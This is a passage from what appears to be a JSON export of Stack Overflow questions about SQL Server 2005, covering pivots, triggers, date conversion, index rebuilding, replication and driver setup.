---------------\nExcludedZero   2\nNoRows         3\nTwoResults     2\n</pre>\n\n<p>When I expected my output to be</p>\n\n<pre>\ngroupCol       distinctInfoCol\n-------------- ---------------\nTwoResults     2\nThreeResults   3\nTwoAndZero     2\n</pre>\n\n<p>What am I doing wrong, and how do I correct this to get the results I need?</p>\n"},{"tags":["sql","performance","sql-server-2005","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":820,"score":-4,"question_id":10926841,"title":"Sql Server 2012 slower than 2005?","body":"<p>We have deployed SQL Server 2012 Enterprise and we have performance issues:</p>\n\n<ul>\n<li>same data (backuped from our SQL Server 2005 Enterprise and restored on 2012)</li>\n<li>test script of 3200 sql SELECT statements</li>\n</ul>\n\n<p>We do tests using Management Studio:</p>\n\n<ol>\n<li>results as plain text</li>\n<li>results in a file</li>\n</ol>\n\n<p>On same computer:</p>\n\n<ol>\n<li>2005 : 15 sec, 2012 : 2 min</li>\n<li>2005 : 14 sec, 2012 : 30 sec</li>\n</ol>\n\n<p>Even with a more powerful computer, 2012 is still slower than 2005.</p>\n\n<p>What can be wrong? The way we installed SQL Server 2012 and default parameters? The way we restored the backup? What can we do?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13168200,"title":"How to use subquery with multiple tables","body":"<p>I'm trying to create a subquery to bring two tables together but am getting nothing.</p>\n\n<p>Code:</p>\n\n<pre><code>SELECT DISTINCT Agreements.AgrmntID, Agreements.Status, JobSites.SiteName,\n  PurchaseOrderDetails.ExtCost\nFROM Agreements Inner Join\n  JobSites On Agreements.CustSiteID = JobSites.CustSiteID\nWHERE Agreements.Status = 2 And PurchaseOrderDetails.ExtCost = (Select\n    PurchaseOrderDetails.ExtCost\n  FROM PurchaseOrderDetails \n  Inner Join PurchaseOrders On PurchaseOrders.POID = PurchaseOrderDetails.POID\n  WHERE PurchaseOrders.Description Like ('%', JobSites.SiteName, '%') And   \n  Convert(varchar(8),PurchaseOrderDetails.TimeCreated,1) = '09/10/12')\nORDER BY JobSites.SiteName\n</code></pre>\n\n<p>Expected Output:</p>\n\n<pre><code>AgreemntID   Status  SiteName  ExtCost\n----------------------------------------\n1            2       TEST01    $144.00\n2            2       TEST02    $400.00\n</code></pre>\n\n<p>I'm using a subquery because there's nothing that links the ExtCost to the SiteName except the Description under PurchaseOrders.</p>\n\n<p>Hopefully this is enough information for you to help me.  Thank you in advance!!</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":201,"score":0,"question_id":3183398,"title":"Trigger only modify updated/inserted row","body":"<p>Hi I have the following trigger.</p>\n\n<p><code>ALTER TRIGGER [dbo].[DivisionLastModified] ON [dbo].[tb_Division]\nWITH EXECUTE AS CALLER\nFOR INSERT, UPDATE\nAS\nBEGIN\nUPDATE tb_Division SET  LastModified = GetDate()\nEND</code></p>\n\n<p>This updates all rows however I only wish to modify the update/added row.\nIs this achievable?</p>\n"},{"tags":["sql","sql-server-2005","index"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":13075245,"title":"SQL Server 2005 IndexOptimize SP against one table's indexes","body":"<p>I'm trying to figure out how to use this <code>IndexOptimize</code> stored procedure that I got from <a href=\"http://ola.hallengren.com/\" rel=\"nofollow\">http://ola.hallengren.com/</a> to run against just a single table's indexes.</p>\n\n<p>When I run the following query:</p>\n\n<pre><code>SELECT * \nFROM sys.dm_db_index_physical_stats (DB_ID(N'database_name'), \n                                     OBJECT_ID(N'dbo.table_name'), \n                                     NULL, NULL , 'DETAILED');'\n</code></pre>\n\n<p>I get this as the result both before and after running the <code>IndexOptimize</code> job:</p>\n\n<p><a href=\"http://cl.ly/image/472J160R1y2n\" rel=\"nofollow\">http://cl.ly/image/472J160R1y2n</a></p>\n\n<p>Here is what I'm trying to run:</p>\n\n<pre><code>EXECUTE dbo.IndexOptimize\n     @Databases = 'database_name',\n     @Indexes = 'database_name.dbo.table_name',\n     @FragmentationLow = NULL,\n     @FragmentationMedium = 'INDEX_REORGANIZE,INDEX_REBUILD_ONLINE',\n     @FragmentationHigh = 'INDEX_REBUILD_ONLINE',\n     @FragmentationLevel1 = 5,\n     @FragmentationLevel2 = 30'\n</code></pre>\n\n<p>The query completes, but it doesn't seem to make a difference to the table's indexes. Am I missing something?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":13151650,"title":"SQL Converting an INSERT SELECT to UPDATE as well","body":"<p>I have some SQL written up to address my problem but it is not quite ready. I have been attempting different queries for days now without much luck. FYI I inherited this DB so it may be a bit more advanced than what I am used to. </p>\n\n<p>There is a many-to-many relationship between Formula and Color using the bridge table FormulaColor. FormulaColor has the columns (FormulaId, ColorId, Percentage).</p>\n\n<p>My Business problem, we are converting all the formulas that use color A with the colors B(1%), C(2.8%) and D(96.2%). So if a Formula currently uses the color A as 50% of the formula then I would add a row for that formula with the B color and a percentage of .5%, a row for C color with a percentage of 1.4% and a row for D color with a percentage of 48.1%.</p>\n\n<p>The problem though, is a given formula that contains color A, may also already contain one or more of colors B, C or D. In that case I need to update the percentage by simply adding what was calculated above.</p>\n\n<p>The actual sql that I have so far is as follows. *Note that this is just for handling 1 of the new colors (ColorId=2594)</p>\n\n<pre><code>INSERT INTO FormulaColor (FormulaId, ColorId, Percentage) \nSELECT FormulaId, 2594 as ColorId, round((.01*FormulaColor.Percentage),2) as Percentage\nFROM FormulaColor WHERE ColorId=2595;\nDELETE FROM FormulaColor WHERE ColorId = 2595;\n</code></pre>\n\n<p>I was thinking that using the upsert method that uses @@rowscount is what I need? If so, I can't figure out how to do the update to just add the calculated amount to the percentage.</p>\n\n<p>Any help or resources is appreciated!</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1396,"score":0,"question_id":3443672,"title":"Integer division in sql server","body":"<p>In Microsoft SQL Server 2005, why do the following commands produce integer results?</p>\n\n<pre><code>SELECT cast(151/6 AS DECIMAL(9,2))\nSELECT 151/6\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":279,"score":1,"question_id":9846148,"title":"Pivot Multiple Rows","body":"<p>I have a table similar to the following:</p>\n\n<pre><code>id    key    str_val    date_val      num_val\n1     A      a\n1     B      b\n1     C                 2012-01-01\n1     D                               1\n2     A      c\n2     E      d\n2     C                 2012-01-02\n2     D                                2\n</code></pre>\n\n<p>I need it to look like:</p>\n\n<pre><code>id    A      B      C             D       E\n1     a      b      2012-01-01    1\n2     c             2012-01-02    2       d\n</code></pre>\n\n<p>Basically, each key needs to become it's own column</p>\n\n<p>I tried and failed to use the PIVOT command usefully, and I'm currently trying to accomplish this with a case statement. i.e.</p>\n\n<pre><code>select\n    id,\n    case key\n        when 'A'\n        then str_val\n    end as A,\n    case key\n        when 'C'\n        then date_val\n    end as C\n    --etc.\nfrom test_table\n</code></pre>\n\n<p>However I can't figure out how to combine the table rows after this runs. I'm stuck with:</p>\n\n<pre><code>id    A      B      C             D       E\n1     a\n1            b\n1                   2012-01-01\n1                                 1\n</code></pre>\n\n<p>Any thoughts or input that could help me out? Thanks in advance.</p>\n"},{"tags":["sql-server-2005","database-tuning"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":226,"score":2,"question_id":3602050,"title":"Undo changes made by SQL Server Database Tuning","body":"<p>I am not sure if this question can be asked here or serverfault. I was wondering...Is there is a way to quickly undo the changes made by SQL Server 2005 Tuning Advsor other than recovering from a backup?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","string-to-datetime"],"answer_count":10,"favorite_count":4,"up_vote_count":16,"down_vote_count":0,"view_count":81288,"score":16,"question_id":207190,"title":"Sql Server string to date conversion","body":"<p>I want to convert a string like this:</p>\n\n<pre><code>'10/15/2008 10:06:32 PM'\n</code></pre>\n\n<p>into the equivalent DATETIME value in Sql Server.</p>\n\n<p>In Oracle, I would say this:</p>\n\n<pre><code>TO_DATE('10/15/2008 10:06:32 PM','MM/DD/YYYY HH:MI:SS AM')\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/202243/custom-datetime-formatting-in-sql-server\">This question</a> implies that I must parse the string into one of the <a href=\"http://msdn.microsoft.com/en-us/library/aa226054(SQL.80).aspx\" rel=\"nofollow\">standard formats</a>, and then convert using one of those codes.  That seems ludicrous for such a mundane operation.  Is there an easier way?</p>\n"},{"tags":["sql-server-2005","coldfusion"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":13148003,"title":"mssql another way to write a query using IN?","body":"<p>I'm updating a web page search form.  The user selects the group names they want to search for.  And on the action page, lets say for simplicity sake, I end up with the following query: </p>\n\n<pre><code>select GroupName\nfrom    groupTable \nwhere groupName in ('Motley Crue','Alvin and the Chipmunks')\n</code></pre>\n\n<p>Normally, this isn't a problem for me but in this case, the database field may also contain a string of names such as:</p>\n\n<pre><code>Big Dog's Chair,Purple Dragon,Just Johnny,Johnny Faster,Van Halen\n</code></pre>\n\n<p>I believe I will have to loop over each item in the database field with each item in my comma delimited list.  If that is the case, I do not know how to do this and I don't know what search terms to use in SO or google.  I could use some help.  </p>\n\n<p>Database:  MSSQL 2005\nColdfusion:  CF9</p>\n\n<p>I leave work in a at 5:00CST so if you reply, I probably wont see it until tomorrow.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2831,"score":1,"question_id":5141521,"title":"How to insert data from Excel sheet to SQL Server 2005","body":"<p>I have an Excel sheet now I need to insert data from that sheet into SQL Server 2005. </p>\n\n<p>I need to create a temp table and insert data into that table. The database name is <code>Employee</code></p>\n\n<p>Can you pls  provide me the syntax for achieving it.</p>\n"},{"tags":["c#","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":49,"score":3,"question_id":13106351,"title":"Issue related to Searching Data in SQL Server","body":"<p>I have SQL datatable StudetnMaster having FirstName nvarchar(100) and contains Data Entry Gujarati Lanuage (Unicode Chracters )</p>\n\n<pre><code>   StudentId   FirstName\n     1           ઘનશ્યામ\n     2           જીગર   \n</code></pre>\n\n<p>now i have following query for searching :</p>\n\n<pre><code>Select * from StudetnMaster where FirstName like N'\" + textBox1.Text.Trim() + \"%' \n</code></pre>\n\n<p>its working fine:</p>\n\n<p>but in stiored procedure i have to pass parameter for FirstName as Follows:</p>\n\n<pre><code>ALTER PROCEDURE dbo.StoredProcedure1\n        @FirstName nvarchar(100)\n\nAS\n\n    select * from StudentNew where FirstName like N@FirstName+'%' \n</code></pre>\n\n<p>but it throws an Error saying : Invalid Column Name N@FirstName</p>\n\n<p>how can i use <code>'N'</code>  in storedProcedure for parameter because without using <code>N'</code> Unicode Text is not searchable: </p>\n\n<p>For inline query as mentioned above i got resut: but for stored procedure i got error: so how can we use     <code>'N'</code>  in storedprocedure?</p>\n\n<p>is there any other solution for searching unicode characters in storedrocedure?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":9,"up_vote_count":31,"down_vote_count":0,"view_count":12778,"score":31,"question_id":175962,"title":"Dynamic SELECT TOP @var In SQL Server","body":"<p>How can I have a dynamic variable setting the amount of rows to return in SQL Server? Below is not valid syntax in SQL Server 2005+:</p>\n\n<pre><code>DECLARE @count int\nSET @count = 20\n\nSELECT TOP @count * FROM SomeTable\n</code></pre>\n"},{"tags":["java","sql","sql-server-2005","playframework","playframework-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13144887,"title":"Setting up Play 2.0 project with Sql Server 2005","body":"<p>I previously had my app set up to use a MySQL db as the default, and it worked fine.</p>\n\n<p>Now I'm trying to get it to work with <strong><em>SQL server 2005</em></strong>. The I tried this and several similar variants:</p>\n\n<h2>application.conf</h2>\n\n<pre><code>db.default.url=\"jdbc:sqlserver://remoteServerName:Port\"\ndb.default.driver=com.microsoft.jdbc.sqlserver.SQLServerDriver\ndb.default.user=correctUser\ndb.default.pass=correctPass\n</code></pre>\n\n<p>But I'm getting the following error:</p>\n\n<pre><code>Driver not found: [com.microsoft.jdbc.sqlserver.SQLServerDriver]\n...\ncaused by: java.lang.ClassNotFoundException: com.microsoft.jdbc.sqlserver.SQLServerDriver\n</code></pre>\n\n<p>At first glance, it seems like this would hint the jdbc driver JAR is missing from the build path. The problem is, it <em>isn't</em> missing from the build path. sqljdbc4.jar is sitting in the build path with everything else.</p>\n\n<p>Am I missing something? I'm not sure where to go here.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13084195,"title":"Summarising data into year ranges","body":"<p>I am trying to sumarise data in sql and am having difficulty finding a method for grouping data.</p>\n\n<p>i have a table named cars</p>\n\n<pre><code>CarID CarMake  CarModel CarYear\n1      Ford      Mondeo   2000\n2      Ford      Mondeo   2002\n3      Ford      Mondeo   2003\n4      Ford      Mondeo   2005\n</code></pre>\n\n<p>I want to be able to group this data to appear as</p>\n\n<pre><code>CarMake CarModel CarYearRange\nFord     Mondeo   2000-2003\nFord     Mondeo   2005-2005\n</code></pre>\n\n<p>I Have tried using min and max to produce this however this fails if the car wasn't made in a year between as in the example.</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1024,"score":1,"question_id":4921724,"title":"Returning index of n-th element in string using tsql","body":"<p>How in SQL Server can I return index of n-th element in string. For example I have string: <strong>a,b,c,d,e</strong>\nNow I want to receive all elements, before third coma, so <strong>a,b,c</strong>. For doing this I need to have index of third coma. Charindex does not fit here, because I cannot pass number of coma, for which I want the index. Is there any built-in function which can do it ?</p>\n\n<p><strong>Update</strong>, @Andriy M.</p>\n\n<p>Hey, the link You pointed me to is also useful. Below I've modified the shown sql a bit to get what I want:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[nthindexsub](@String varchar(8000), @Delimiter char(1), @DelimitersCount int)       \n returns varchar(8000)\n as       \n begin       \n     declare @Substring varchar(8000)\n     declare @temptable TABLE (itemindex int identity(1,1), items varchar(8000))\n     declare @idx int       \n     declare @slice varchar(8000)     \n\n     select @idx = 1       \n         if len(@String)&lt;1 or @String is null  return @Substring \n\n     while @idx!= 0       \n     begin       \n         set @idx = charindex(@Delimiter,@String)       \n         if @idx!=0       \n             set @slice = left(@String,@idx - 1)       \n         else       \n             set @slice = @String       \n\n         if(len(@slice)&gt;0)  \n             insert into @temptable(Items) values(@slice)       \n\n         set @String = right(@String,len(@String) - @idx)       \n         if len(@String) = 0 break       \n     end\n\n     select @Substring = COALESCE(@Substring + ',', '') + items from @temptable where itemindex &lt;= @DelimitersCount  \n     return @Substring;\n end\n</code></pre>\n\n<p>usage:</p>\n\n<pre><code>select dbo.nthindexsub('a,b,c,d,e', ',', 3)\n</code></pre>\n\n<p>the result is: <strong>a,b,c</strong></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13152230,"title":"\"WHEN OTHERS THEN NULL\" in SQL Server 2005","body":"<p><code>tracking_table</code> is a log table declared as follows:</p>\n\n<pre><code>create table tracking_table (my_command nvarchar(500), my_date datetime);\n</code></pre>\n\n<p>Please suppose you have the following block of SQL SERVER 2005 code, declared within a SQL Server 2005 job:</p>\n\n<pre><code>DECLARE @my_statement NVARCHAR(500)  \ndelete from tracking_table\n   SET @my_statement = 'ALTER INDEX ALL ON my_user.dbo.my_fact_table REBUILD WITH (FILLFACTOR = 90)'\ninsert into tracking_table values (@my_statement,getdate()) \nEXEC (@my_statement)  \n SET @my_statement = 'ALTER INDEX ALL ON my_user.dbo.my_second_table REBUILD WITH (FILLFACTOR = 90)'\ninsert into tracking_table (@my_statement,getdate())    \nEXEC (@my_statement)  \n</code></pre>\n\n<p>At runtime, if the first statement (<code>ALTER INDEX ALL ON my_user.dbo.my_fact_table REBUILD WITH (FILLFACTOR=90)</code>) fails, the second statement which acts on my_second table WON'T be executed.</p>\n\n<p>I would like to know how could I modify the SQL Server 2005 code, in order to skip any error, going forward (in Oracle I would say, <code>WHEN OTHERS THEN NULL</code>).</p>\n\n<p>How could I achieve this?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13150356,"title":"How to display the first row, depending on a value","body":"<p>I am supposed to build a query that displays if a product passed quality test the first time. for example if product# 1234 fails the first test then don't display the value. I am running SQL Server 2005. I am thinking maybe using a <code>COALESCE</code> statement, or case when statement, any help would be appreciated. here is some sample data:</p>\n\n<pre><code>product#  test result   datetime\n1102494    Fail         20111129:07:57:50.203\n1102494    pass         20111130:16:48:28.140\n1102496    pass         20111129:11:09:32.140\n1102498    pass         20111129:08:21:10.218\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","replication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":56,"score":0,"question_id":13082881,"title":"sql table with identity in merge replication","body":"<p>I have a table in SQL Server 2005 and I have an IDENTITY(1,1) property set for an ID column.  Records are inserted in a table at a local server as well as a remote server.  I am using Merge Replication to match the data from local server and remote server.</p>\n\n<p>What happens if I insert the same ID at the local server and the remote server?</p>\n\n<p>Please suggest what am I doing wrong here.</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":8,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":7802,"score":2,"question_id":1227707,"title":"How to get last insert/update/delete datetime on Sql Server 2005?","body":"<p>not a duplicate of <a href=\"http://stackoverflow.com/questions/1227593/how-to-get-last-modification-datetime-on-sql-server-2005\">my previous question</a></p>\n\n<p>Is there any way to get the latest datetime when a table/database had an insert/update/delete on Sql Server 2005? Preferably without creating triggers..</p>\n\n<p>I know that when you need the last update per row, you need triggers. But I am not sure if they are needed when you just want to get the last update for the whole table.</p>\n"},{"tags":["sql-server","sql-server-2005","dbo"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":18,"score":2,"question_id":13147695,"title":"SQL Server dbo permissions for specified databases","body":"<p>Can I assign SQL Server dbo permissions to a user, so it applies only for specified databases on a server?  Currently using SQL Server 2005.</p>\n"},{"tags":["c#","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":493,"score":0,"question_id":3226571,"title":"how i can generate programmatically \"insert into\" data script file from a database table?","body":"<p>is there an elegant object-orient based framework?</p>\n"},{"tags":["c#","sql-server-2005","dsn"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1307,"score":0,"question_id":2844074,"title":"How to create DSN for SQL Server using C#?","body":"<pre><code>using System;\n\nusing System.Collections.Generic;\n\nusing System.ComponentModel;\n\nusing System.Data;\n\nusing System.Drawing;\n\nusing System.Linq;\n\nusing System.Text;\n\nusing System.Windows.Forms;\n\nusing Microsoft.SqlServer.Management.Common;\n\nusing Microsoft.SqlServer.Management.Smo;\n\nusing System.Data.SqlClient;\n\nusing Microsoft.Win32;\n\nusing System.Runtime.InteropServices;\n\n\n[DllImport(\"ODBCCP32.dll\")]\n\nprivate static extern bool SQLConfigDataSource(IntPtr parent, int request, string driver, string attributes);\n\n\n\nnamespace CopyDatabase\n{\n\npublic partial class Synchronize : Form\n{\n\n    public Synchronize()\n    {\n        InitializeComponent();\n    }\n\n    private void Synchronize_Load(object sender, EventArgs e)\n    {\n        Server srv = new Server();\n        String[] s = { \"master\", \"tempdb\", \"model\", \"msdb\", \"Resource\", \"distribution\" };\n\n        foreach (Database database in srv.Databases)\n        {\n            int flag = 0;\n            for (int i = 0; i &lt; s.Length; i++)\n            {\n                if (String.Compare(database.Name, s[i], true) == 0)\n                {\n                    flag = 1;\n                    break;\n                }\n            }\n            if (flag == 0)\n            {\n                cmbSource.Items.Add(database.Name);\n                cmbDest.Items.Add(database.Name);\n            }\n        }\n    }\n    private void button1_Click(object sender, EventArgs e)\n    {\n       string str = \"SERVER=HOME\\0DSN=MYDSN\\0DESCRIPTION=MYDSNDESC\\0DATABASE=DBServer\\0TRUSTED_CONNECTION=YES\";\n        SQLConfigDataSource((IntPtr)0, 4, \"SQL Server\",str);\n    }\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Reference :\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/vscrystalreports/thread/441811b9-c4e9-4d15-97a3-7b92d2c9f318\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/vscrystalreports/thread/441811b9-c4e9-4d15-97a3-7b92d2c9f318</a></p>\n\n<p>Can anybody help me remove the following errors??</p>\n\n<blockquote>\n  <p>Error 1   Expected class, delegate,\n  enum, interface, or\n  struct    C:\\Documents and\n  Settings\\Pavan\\My Documents\\Visual\n  Studio\n  2008\\Projects\\CopyDatabase\\CopyDatabase\\Synchronize.cs    17  23  CopyDatabase</p>\n</blockquote>\n\n<p>.</p>\n\n<blockquote>\n  <p>Error 2   The name 'SQLConfigDataSource'\n  does not exist in the current\n  context   C:\\Documents and\n  Settings\\Pavan\\My Documents\\Visual\n  Studio\n  2008\\Projects\\CopyDatabase\\CopyDatabase\\Synchronize.cs    67  13  CopyDatabase</p>\n</blockquote>\n"},{"tags":["sql-server-2005","database-design","data-modeling"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1392,"score":3,"question_id":2391298,"title":"SQL Server primary key on datetime field","body":"<p>I'm creating a new table in SQL Server 2005 that needs 2 fields: DateTime and MyValue (Int32). The DateTime field will be unique so I will be setting a unique constraint on it.</p>\n\n<p>Which table structure is better and why?</p>\n\n<p>MyIndex (PK, int)<br>\nMyDate (datetime) (IX_UniqueKey)<br>\nMyValue (int)</p>\n\n<p>or</p>\n\n<p>MyDate (PK, datetime)<br>\nMyValue (int)</p>\n\n<p>My feeling is that I don't want an artificial PK (MyIndex) in this table because it is unnecessary and because the dates will be unique I will use them to access any record. However, it may be that it's more performant to have an artificial PK...?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13134739,"title":"is there a way to store a word file in SQL Server 2005?","body":"<p><br>\nI am trying to store a word file in mysql server management studio 2005 and when i researched for it all the post said try using blob. But the problem i have now is that there is no blob data type. Is there any other way to store the word file or even if possible a replacement for a blob data type\n<br>\nThanks </p>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":521,"score":2,"question_id":3843256,"title":"Where does a Server trigger save in SQL Server?","body":"<p>A couple of days ago , I was practicing and I wrote some triggers like these :</p>\n\n<pre><code>create trigger trg_preventionDrop\non all server \nfor drop_database\nas\nprint 'Can not Drop Database'\nrollback tran\n\ngo \n\ncreate trigger trg_preventDeleteTable\non database\nfor drop_table\nas \nprint 'you can not delete any table'\nrollback tran\n</code></pre>\n\n<p>But the problem is I don't know where it has saved and How can I delete or edit those.</p>\n\n<p>Thank you </p>\n"},{"tags":["sql-server-2005","unicode","where-clause"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13133277,"title":"How To Use Where Clause & LIKE with Unicode Characters?","body":"<p>I Have a table with column donor details and i am using following query to bind a grid in asp.net back end is sql server 2005.donordetails is a unicode column</p>\n\n<pre><code>select donordetails,serialno,did from sktdonor where donordetails  like N'% \"+  DropDownList1.SelectedItem.Text +\" %' order by serialno asc\n</code></pre>\n\n<p><strong>THE QUERY GOT EXECUTED BUT IT SHOWS NO OUTPUT\nPLEASE HELP !!!!</strong></p>\n"},{"tags":["sql","xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13134610,"title":"SQL Server 2005 Query XML Data Type related","body":"<p>I am selecting 2 sets of columns from the same table, as follows.</p>\n\n<pre><code>select (select a, b, c from T1 FOR XML RAW('CAT1')),\n       (select d, e, f from T1 FOR XML RAW('CAT2'))\nfor XML PATH('Parent')\n</code></pre>\n\n<p>The result of the query is </p>\n\n<pre><code>&lt;Parent&gt;&amp;lt;CAT1 a=\"Data1\" b=\"Data2', c=\"Data3\" &amp;gt;&amp;lt;CAT2 d=\"Data4\" e=\"Data5\" f=\"Data6\"&amp;gt;&lt;/Parent&gt;\n</code></pre>\n\n<p>How to avoid? I would get enclosed in a proper parent xml?</p>\n\n<p>Expected Result</p>\n\n<pre><code>&lt;Parent&gt;\n   &lt;CAT1 a=\"Data1\" b=\"Data2', c=\"Data3\"&gt;\n   &lt;CAT2 d=\"Data4\" e=\"Data5\" f=\"Data6\"&gt;\n&lt;/Parent&gt;\n</code></pre>\n"},{"tags":["sql-server","oracle","sql-server-2008","sql-server-2005","oracle11g"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13133378,"title":"Data Migration From Oracle To SQL Server","body":"<p>I have Oracle database in that in one or more table I have blob data also, i.e. images are stored, now I would like to move that data to sql server database, what is the best way to do this ?</p>\n\n<p>I would like to test for one table migration which contains image data in the Oracle database and move into SQL Server table.</p>\n\n<p>How do I test for migrating data from one table from Oracle to SQL Server ?</p>\n\n<p>but first thing I would like to confirm is that whether Image data moving from Oracle DB to SQL Server DB is possible, is there anything has to be taken care while migrating ?</p>\n\n<p>Thanks in advance.</p>\n\n<p>With Best Regards</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13133352,"title":"Insert dynamic rows to a single column","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/451415/simulating-group-concat-mysql-function-in-microsoft-sql-server-2005\">Simulating group_concat MySQL function in Microsoft SQL Server 2005?</a>  </p>\n</blockquote>\n\n\n\n<p>How will I insert rows (which are dynamic) to a single column concatenated by space to a temp table. I'm using SQL Server 2005.</p>\n\n<p>Ex. <code>LetterTable</code>:</p>\n\n<pre><code>LetterID LetterRow\n    1        a\n    2        b\n    3        c\n    4        d\n    5        e\n</code></pre>\n\n<p>to insert to a temp table like</p>\n\n<p><code>#TempTable</code>:</p>\n\n<pre><code>LetterID LetterRow\n    1     a b c d e\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1871,"score":2,"question_id":4875513,"title":"error in Multiple Select statements in Insert statement","body":"<p>I am writing a query which has multiple select statements in an insert statement</p>\n\n<pre><code>    INSERT INTO dbo.Products \n    (ProductName, \n     SupplierID, \n     CategoryID, \n     UnitsInStock, \n     UnitsOnOrder, \n     ReorderLevel, \n     Discontinued)\nVALUES  \n    ('Twinkies' , \n     (SELECT SupplierID FROM dbo.Suppliers WHERE CompanyName = 'Lyngbysild'),\n     (SELECT CategoryID FROM dbo.Categories WHERE CategoryName = 'Confections'), \n     0, \n     0, \n     10, \n     0)\n</code></pre>\n\n<p>Actually it gives error</p>\n\n<pre><code>Msg 1046, Level 15, State 1, Line 4\nSubqueries are not allowed in this context. Only scalar expressions are allowed.\nMsg 102, Level 15, State 1, Line 4\nIncorrect syntax near ','.\n</code></pre>\n\n<p>Where these two select statements returns only one value.</p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13130303,"title":"SQL Server Query with boolean issue","body":"<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n\nalter PROCEDURE [dbo].[TCCPAUsersAndNamesByJobPosition] @EmpOrfreeLance bit\n\nAS\nBEGIN\n    SET NOCOUNT ON;\n\n    SELECT distinct t1.UserId , tblCustomers.name \n    FROM tblTime t1\n    inner join tblCustomers on t1.UserId=tblCustomers.custID\n    where (t1.userid in (select distinct custID from tblCustomers where sectionCat Like '%,35%') )\n    AND (t1.UserId in (select distinct custID from tblCustomers where IsEmployee = @EmpOrfreeLance))\n\nend\n</code></pre>\n\n<p>tried it also with  <code>IsEmployee = CONVERT(bit,@EmpOrfreeLance)</code></p>\n\n<p>and <code>SET @EmpOrfreeLance= CASE @EmpOrfreeLance WHEN 1 THEN 0 ELSE 0 END</code></p>\n\n<p>same all it retuns same list with same results no matter what </p>\n\n<p>Shouldn't it be simple ???</p>\n\n<p><code>IsEmployee</code> col-datatype is <code>(bit,null)</code></p>\n\n<p>my dev SQL server is 2008 ..online server is 2005 should it be a matter ...  </p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13128685,"title":"Atomic update statement with select SQL Server","body":"<pre><code>INSERT stuff\nSET computed = 'working'\nWHERE id = (SELECT max(id) from STUFF WHERE x = y)\n</code></pre>\n\n<p>I would like to make this statement atomic in SQL Server 2005 SP 1.</p>\n\n<p>Is there a way of doing this without modifying the isolation 